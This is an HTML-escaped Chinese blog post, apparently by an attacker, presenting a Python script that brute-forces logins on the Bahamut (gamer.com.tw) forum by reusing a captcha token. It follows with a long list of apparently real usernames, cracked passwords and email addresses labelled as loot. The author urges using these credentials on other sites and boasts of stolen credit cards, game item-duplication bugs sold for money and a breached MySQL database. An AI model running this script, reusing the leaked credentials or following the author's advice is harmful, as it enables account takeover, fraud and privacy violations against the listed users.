f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;autoLogin\\&quot;\\r\\n\\r\\n&quot;\n        &quot;T\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;alternativeCaptcha\\&quot;\\r\\n\\r\\n&quot;\n        f&quot;&#123;alternativeCaptcha&#125;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;twoStepAuth\\&quot;\\r\\n\\r\\n&quot;\n        &quot;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;--\\r\\n&quot;\n    )\n\n\n    response = requests.post(url, headers=headers, cookies=cookies, data=body.encode(&quot;utf-8&quot;))\n\n\n    if &#39;&quot;error&quot;&#39; not in response.text:\n        print(f&quot;✅ Username: &#123;i&#125;, Password: &#123;b&#125;, Status Code: &#123;response.status_code&#125;&quot;)\n        print(&quot;Response:&quot;, response.text)\n\n        if i in usernames:\n            usernames.remove(i)\n            with open(&quot;9999.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:\n                f.write(&#39;\\n&#39;.join(usernames) + &#39;\\n&#39;)\n\n        # 加入 99.txt\n        with open(&quot;99.txt&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;) as f:\n            f.write(i + &#39;\\n&#39;)\n\n    elif &#39;&quot;CSRF_TOKEN_ERROR&quot;&#39; in response.text:\n        print(f&quot;🚫 CSRF ERROR Username: &#123;i&#125;, Password: &#123;b&#125;, Status Code: &#123;response.status_code&#125;&quot;)\n        print(&quot;Response:&quot;, response.text)\n\n    return\n\n\n\nwith open(&quot;9999.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as file:\n    usernames = [line.strip() for line in file if line.strip()]\n\nfor i in usernames:\n    c = re.sub(r&#39;[a-zA-Z]&#39;, &#39;a&#39;, i)\n    b = c.replace(&quot;aa&quot;, &quot;a&quot;)  \n    login_gamer(i, b)\n</code></pre>\n<p>以下是戰利品，簡簡單單的腳本可以造成如此可怕的破壞性。 可以將其拿去撞庫其他網站。</p>\n<pre><code>Username: aa0903465890, Password: a0903465890, Status Code: 200  a0903465890@gmail.com 動漫風\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0952121590, Password: a0952121590, Status Code: 200  bodishenqi@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0909165363, Password: a0909165363, Status Code: 200 a0952148610@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0903892528, Password: a0903892528, Status Code: 200 b0903892528@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: w0906997609, Password: a0906997609, Status Code: 200 datealive24561715@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0907711641, Password: a0907711641, Status Code: 200 a0932602130@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0985883382, Password: a0985883382, Status Code: 200 b0985883382@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0902445622, Password: a0902445622, Status Code: 200 a0902445622@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0968223897, Password: a0968223897, Status Code: 200  a0968223897@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0910525, Password: a0910525, Status Code: 200 aa0928252609@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: e0973943179, Password: a0973943179, Status Code: 200 lovebaby19810802@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0918681748, Password: a0918681748, Status Code: 200 love0918681748@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: st0986808392, Password: a0986808392, Status Code: 200 st882810@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0968954488, Password: a0968954488, Status Code: 200 gg122504531@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0935962575, Password: a0935962575, Status Code: 200 asdw95049@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0953956567, Password: a0953956567, Status Code: 200 a0953956567@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0987890752, Password: a0987890752, Status Code: 200 young30987@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0906566327, Password: a0906566327, Status Code: 200 a0906566327@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: f0916727293, Password: a0916727293, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b09158500, Password: a09158500, Status Code: 200 b0909158500@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: jy0907007336, Password: a0907007336, Status Code: 200 chizhengyou535@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: zx0980821344, Password: a0980821344, Status Code: 200 a0980821344@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: a709980792, Password: a709980792, Status Code: 200 msn709980792@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: l0903019107, Password: a0903019107, Status Code: 200 adwx83@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: gg0910288118, Password: a0910288118, Status Code: 200 louser9487@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: c0905610929, Password: a0905610929, Status Code: 200 a0905610929@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: c0968908771, Password: a0968908771, Status Code: 200 gavin62115@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s097944987, Password: a097944987, Status Code: 200 jason930312@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: je0928511681, Password: a0928511681, Status Code: 200 a0928511681@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0916543726, Password: a0916543726, Status Code: 200 chan92726@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: l0909340420, Password: a0909340420, Status Code: 200 a0909340420@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: os0984028800, Password: a0984028800, Status Code: 200 \nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0977300591, Password: a0977300591, Status Code: 200 a0977300591@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0965107208, Password: a0965107208, Status Code: 200 a0965107208@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0905795377, Password: a0905795377, Status Code: 200 aa0905795377@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0951115, Password: a0951115, Status Code: 200    s0951115@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ji0966109453, Password: a0966109453, Status Code: 200 a0966109453@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0905427665, Password: a0905427665, Status Code: 200 a0905427665@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: p090749499, Password: pp090749499, Status Code: 200  p090749499@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: t0912287071, Password: tt0912287071, Status Code: 200  t091228.t7071@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: j090276, Password: jj090276, Status Code: 200 j090276@my.cmsh.cyc.edu.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: aa0981073215, Password: aa0981073215, Status Code: 200  a0981073215@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: l0990209, Password: l0990209, Status Code: 200  z6865105@gmail.com shipeicen992@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: h10911218, Password: h10911218, Status Code: 200 kencatu@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: m0976722676, Password: m0976722676, Status Code: 200 scorpio2014520@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: j0905911501, Password: j0905911501, Status Code: 200 jeff29218829@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: f0980466920, Password: f0980466920, Status Code: 200 poror81333@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n✅ Username: s0987550111, Password: s0987550111, Status Code: 200 s0987550111@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n以下密碼同帳號\nok0927719082  okok0927719082@gmail.com\nm0965007291 s9007311@gmail.com\nk0966525111  cruoen@gmail.com 2000-08-17 6889\nk0963106226 k0963106226\naa0920686666  Aa0920686666@icloud.com\nb0935429595 b0935429595@gmail.com\nd09231202 willy5931@gmail.com\nw0965572698\nk0970283000 kaononog@gmail.com\nvi0909211939 erli90889@gmail.com\njs0975546884 js0975546884@gmail.com\ns0970572524 w674961@gmail.com 這個\nq0903571195 jay136001@gmail.com\naa0909503439 50014@thjh.tc.edu.tw\nq0905394257 q0905394257@gmail.com\nw0906181410\nav0907325862 0963521qq@gmail.com  有\nUsername: aa09210035, Password: a09210035, Status Code: 200  a09210822@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: u0979254001, Password: a0979254001, Status Code: 200 unicorn0979254001@icloud.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0912633373, Password: a0912633373, Status Code: 200 aa0912633373@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0911805750, Password: a0911805750, Status Code: 200 a0911805750@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0966176188, Password: a0966176188, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0905292491, Password: a0905292491, Status Code: 200 abc092053@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0938918616, Password: a0938918616, Status Code: 200 a0938918616@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0960960809, Password: a0960960809, Status Code: 200 love088613559@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0920194989, Password: a0920194989, Status Code: 200 a0920194989@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0909591313, Password: a0909591313, Status Code: 200 cmy0909591313@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: r0972880749, Password: a0972880749, Status Code: 200 r0972880749@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0976681217, Password: a0976681217, Status Code: 200 a0976681217@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0960300399, Password: a0960300399, Status Code: 200 a0960300399@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0903060747, Password: a0903060747, Status Code: 200 a0903060747@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0903559094, Password: a0903559094, Status Code: 200 a090355909432@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: k0933944907, Password: a0933944907, Status Code: 200 annime284@icloud.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0905879083, Password: a0905879083, Status Code: 200 a0905879083@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: pe0988977410, Password: a0988977410, Status Code: 200 a0988977410@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0908279601, Password: a0908279601, Status Code: 200 csc908279601@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: m0905660182, Password: a0905660182, Status Code: 200 a0905660182@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0908550262, Password: a0908550262, Status Code: 200 a0908550262@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0966120010, Password: a0966120010, Status Code: 200 q0966120010@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0965332258, Password: a0965332258, Status Code: 200 a0965332258@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: t0909514986, Password: a0909514986, Status Code: 200 a0909514986@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0908365535, Password: a0908365535, Status Code: 200 b0908365535@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0980458882, Password: a0980458882, Status Code: 200 a871888@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: p0965494790, Password: a0965494790, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: yx0974043504, Password: a0974043504, Status Code: 200 a0974043504@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0979042990, Password: a0979042990, Status Code: 200 jess518313@yahoo.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0963566296, Password: a0963566296, Status Code: 200 a0963566296@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0928452731, Password: a0928452731, Status Code: 200 a0928452731@gmail.com st2630322@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0975285779, Password: a0975285779, Status Code: 200 a0975297472@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0911202824, Password: a0911202824, Status Code: 200 \nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0989569855, Password: a0989569855, Status Code: 200 -acps91152@gmail.com  -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0912660626, Password: a0912660626, Status Code: 200 -a060943@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0909070825, Password: a0909070825, Status Code: 200 a0909070825@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0936780533, Password: a0936780533, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0979580968, Password: a0979580968, Status Code: 200 b0979580968@gmail.com  -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0902101002, Password: a0902101002, Status Code: 200 aa0902101002@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0985430586, Password: a0985430586, Status Code: 200 a0985430586@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0906730857, Password: a0906730857, Status Code: 200 \nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0963756676, Password: a0963756676, Status Code: 200 a0963756676@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0981388805, Password: a0981388805, Status Code: 200 weileyhu0813@yahoo.com.tw -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: w0908450298, Password: a0908450298, Status Code: 200 rex930504@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: r0980018123, Password: a0980018123, Status Code: 200   -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: sa0981232712, Password: a0981232712, Status Code: 200 sa0981232712@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0903738680, Password: a0903738680-, Status Code: 200 a0903738680@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0973886245, Password: a0973886245, Status Code: 200 s0973886245@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0900413183, Password: a0900413183, Status Code: 200 dog970dog@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0921781869, Password: a0921781869, Status Code: 200 sxiao6071@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: q0970788600, Password: a0970788600, Status Code: 200 aaa0970788600@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0903828673, Password: a0903828673, Status Code: 200 C107113210@nkust.edu.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: t0972811154, Password: a0972811154, Status Code: 200 t0972811154@gmail.com -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0986199269, Password: a0986199269, Status Code: 200 doublew0423@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0970566527, Password: a0970566527, Status Code: 200 hunhun168168268@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0988257795, Password: a0988257795, Status Code: 200 a0988257795@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0939282769, Password: a0939282769, Status Code: 200 axz123123@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0952070619, Password: a0952070619, Status Code: 200 a0952070619@gmail.com   -\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0970763930, Password: a0970763930, Status Code: 200 a0970763930@icloud.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0905180925, Password: a0905180925, Status Code: 200 a0905180925@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: c0906522264, Password: a0906522264, Status Code: 200 a0906522264@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0932729141, Password: a0932729141, Status Code: 200 a0932729141@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z0920212123, Password: a0920212123, Status Code: 200 sp40384579@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0925093877, Password: a0925093877, Status Code: 200 a0925093877@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: lj0965137654, Password: a0965137654, Status Code: 200 melody19991018@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: bo0906364202, Password: a0906364202, Status Code: 200 continue88@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0979767832, Password: a0979767832, Status Code: 200 a080888888@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0979619251, Password: a0979619251, Status Code: 200 aa0979619251@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0972808320, Password: a0972808320, Status Code: 200 a0972808320@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: as0986307029, Password: a0986307029, Status Code: 200 as0986307029@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: ab0976744597, Password: a0976744597, Status Code: 200 a0976744597@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: b0907746473, Password: a0907746473, Status Code: 200 a0907746473@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: z09781279, Password: a09781279, Status Code: 200 xx192922@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: j0978099261, Password: a0978099261, Status Code: 200 smile0978099265@yahoo.com.tw\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0939015430, Password: a0939015430, Status Code: 200 a0939015430@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: s0965005858, Password: a0965005858, Status Code: 200 a0965005858@gmail.com\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\nUsername: aa0905664221, Password: a0905664221, Status Code: 200\nResponse: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;\n</code></pre>\n<p>但是!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p>\n<p>打下帳號頂多獲得facebook，身分證.信用卡等等，我確實拿到了信用卡好幾張2張過期 3張未過期，但是他們共同點，無法使用。</p>\n<p>也沒有勒索功能。純屬自嗨!?</p>\n<p>滲透mysql庫呢，去年我打下了一個mysql庫，他被滲透原因，把mysql庫的密碼，寫在客戶端，被我逆向取出。</p>\n<p>也沒有勒索價值，mysql庫權限十分嚴格，我無法提權到系統root 只有mysql的root。</p>\n<p>或許我應該去打企業或是更高價值的地方。</p>\n","excerpt":"","more":"<p>現今的滲透<br>已經AI化了<br>各種腳本  打下網站  </p>\n<p>大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫<br>除非工程師程式邏輯有問題</p>\n<p>就像是如今全球服<a href=\"https://www.x-legend.com/online/grandfantasia-origin/zh-hant/\">精靈樂章</a> 的 API 整數溢出  在內存中 輸入(65536 &#x2F; 2 -1) 就能觸發</p>\n<p><a href=\"https://ff.x-legend.com.tw/index_in.php\">幻想神域</a> 台服的轉帳系統異常一樣</p>\n<p>都可以構成無限複製虛寶，販賣給玩家是有錢賺的。</p>\n<p>某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站的防禦功能失效。</p>\n<p>台灣論壇巴哈姆特的防腳本Captcha存在漏洞，實際上不用點擊圖片就能無限制瘋狂登入測試帳密，對於駭客沒有起到防禦作用，頂多防治低端駭客。</p>\n<p>以下是巴哈姆特的exploit</p>\n<pre><code>import requests\nimport re\ndef login_gamer(i: str, b: str):\n    url = &quot;https://user.gamer.com.tw/ajax/do_login.php&quot;\n    boundary = &quot;----WebKitFormBoundary43kaavhQRXxSIS8T&quot;\n    alternativeCaptcha=&quot;00fc6930b735e3cad682e0853a5e7de13b89d97fd3ec5ad167f2ba6b&quot;\n\n    # Cookies  boundary  alternativeCaptcha 也要更新\n    cookies = &#123;\n        &quot;_ga&quot;: &quot;GA1.1.1957928680.1732967366&quot;,\n        &quot;ckM&quot;: &quot;2531167198&quot;,\n        &quot;buap_modr&quot;: &quot;p014&quot;,\n        &quot;buap_puoo&quot;: &quot;p301&quot;,\n        &quot;ckGUILD_lastBrowse&quot;: &quot;[[%22393%22%2C%22%E6%AD%B7%E5%8F%B2%E3%81%AE%E7%B4%B3%E5%A3%AB%E5%85%AC%E6%9C%83&lt;%E3%82%9D%CF%89%E3%83%BB%22]%2C[%2216197%22%2C%22%E5%A0%B4%E5%A4%96%E4%BA%BA%E7%94%9F%22]]&quot;,\n        &quot;__cf_bm&quot;: &quot;mKDJpSKveQTKgl_fc6yuPtBbSyXcrhujBogkMvHPNso-1734356145-1.0.1.1-Q4xXxyx1VD13BCae5ygrGeY76tskUbcg3HDEXHnwcFUld5j1UZ_lbQKNVUun8pDMU5CvDEDJrPkzKFVo9ivUpA&quot;,\n    &#125;\n    headers = &#123;\n        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;,\n        &quot;Accept&quot;: &quot;*/*&quot;,\n        &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;,\n        &quot;Accept-Language&quot;: &quot;zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7&quot;,\n        &quot;Cache-Control&quot;: &quot;no-cache&quot;,\n        &quot;Origin&quot;: &quot;https://user.gamer.com.tw&quot;,\n        &quot;Pragma&quot;: &quot;no-cache&quot;,\n        &quot;Referer&quot;: &quot;https://user.gamer.com.tw/login.php&quot;,\n        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,\n        &quot;Content-Type&quot;: f&quot;multipart/form-data; boundary=&#123;boundary&#125;&quot;\n    &#125;\n\n    body = (\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;userid\\&quot;\\r\\n\\r\\n&quot;\n        f&quot;&#123;i&#125;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;password\\&quot;\\r\\n\\r\\n&quot;\n        f&quot;&#123;b&#125;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;autoLogin\\&quot;\\r\\n\\r\\n&quot;\n        &quot;T\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;alternativeCaptcha\\&quot;\\r\\n\\r\\n&quot;\n        f&quot;&#123;alternativeCaptcha&#125;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;\\r\\n&quot;\n        &quot;Content-Disposition: form-data; name=\\&quot;twoStepAuth\\&quot;\\r\\n\\r\\n&quot;\n        &quot;\\r\\n&quot;\n        f&quot;--&#123;boundary&#125;--\\r\\n&quot;\n    )\n\n\n    response = requests.post(url, headers=headers, cookies=cookies, data=body.encode(&quot;utf-8&quot;))\n\n\n    if &#39;&quot;error&quot;&#39; not in response.text:\n        print(f&quot;✅ Username: &#123;i&#125;, Password: &#123;b&#125;, Status Code: &#123;response.status_code&#125;&quot;)\n        print(&quot;Response:&quot;, response.text)\n\n        if i in usernames:\n            usernames.remove(i)\n            with open(&quot;9999.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:\n                f.write(&#39;\\n&#39;.join(usernames) + &#39;\\n&#39;)\n\n        # 加入 99.txt\n        with open(&quot;99.txt&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;) as f:\n            f.write(i + &#39;\\n&#39;)\n\n    elif &#39;&quot;CSRF_TOKEN_ERROR&quot;&#39; in response.text:\n        print(f&quot;🚫 CSRF ERROR Username: &#123;i&#125;, Password: &#123;b&#125;, Status Code: &#123;response.status_code&#125;&quot;)\n        print(&quot;Response:&quot;, response.text)\n\n    return\n\n\n\nwith open(&quot;9999.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as file:\n    usernames = [line.strip() for line in file if line.strip()]\n\nfor i in usernames:\n    c = re.sub(r&#39;[a-zA-Z]&#39;, &#39;a&#39;, i)\n    b = 